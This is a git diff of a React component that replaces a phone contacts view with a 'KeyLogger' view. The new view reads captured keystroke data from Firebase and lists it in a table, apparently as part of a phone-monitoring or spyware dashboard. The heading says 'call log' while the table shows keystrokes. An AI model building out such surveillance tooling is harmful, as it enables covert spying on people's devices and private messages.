@@ -1,53 +1,51 @@
-import {child, get, onValue, ref} from "firebase/database";
+import { ref, get, child } from "firebase/database";
 import { auth, db } from '../firebase';
 import React, { useState, useEffect } from 'react';
 import { onAuthStateChanged } from "firebase/auth";
 
-export default function Contacts(props) {
-    const [contacts, setContacts] = useState([]);
+export default function KeyLogger(props) {
+    const [keylogs, setKeyLogs] = useState([]);
     const { phone } = props;
 
     useEffect(() => {
         if (phone) {
             onAuthStateChanged(auth, (user) => {
                 const dbRef = ref(db);
-                get(child(dbRef, `user/${user.uid}/${phone}/contacts`)).then((snapshot) => {
+                get(child(dbRef, `user/${user.uid}/${phone}/keyLogger/data`)).then((snapshot) => {
                     if (snapshot.exists()) {
-                        const data = snapshot.val();
-                        setContacts(data);
+                        Object.values(snapshot.val()).map((key) => {
+                            setKeyLogs((prev) => [...prev, key]);
+                        })
+                        //setKeyLogs(snapshot.val());
                     } else {
                         console.log("No data available");
-                        alert("No contact")
                     }
                 }).catch((error) => {
                     console.error(error);
                 });
-
             });
         }
     }, [phone])
 
     return <div className="card p-3" >
-        <h1>CONTACTS</h1>
+        <h1>Log d'appels</h1>
 
         <table className="table">
             <thead>
-                <tr>
-                    <td>Nom du contact</td>
-                    <td>Numéro de téléphone</td>
-                </tr>
+            <tr>
+                <td>Données</td>
+            </tr>
             </thead>
             <tbody>
             {
-                contacts.map((contact, index) => (
+                keylogs.map((log, index) => (
                     <tr key={index}>
-                        <td>{contact.name}</td>
-                        <td>{contact.number}</td>
+                        <td>{log.keyText}</td>
                     </tr>
                 ))
             }
             </tbody>
-
         </table>
+
     </div>
 }
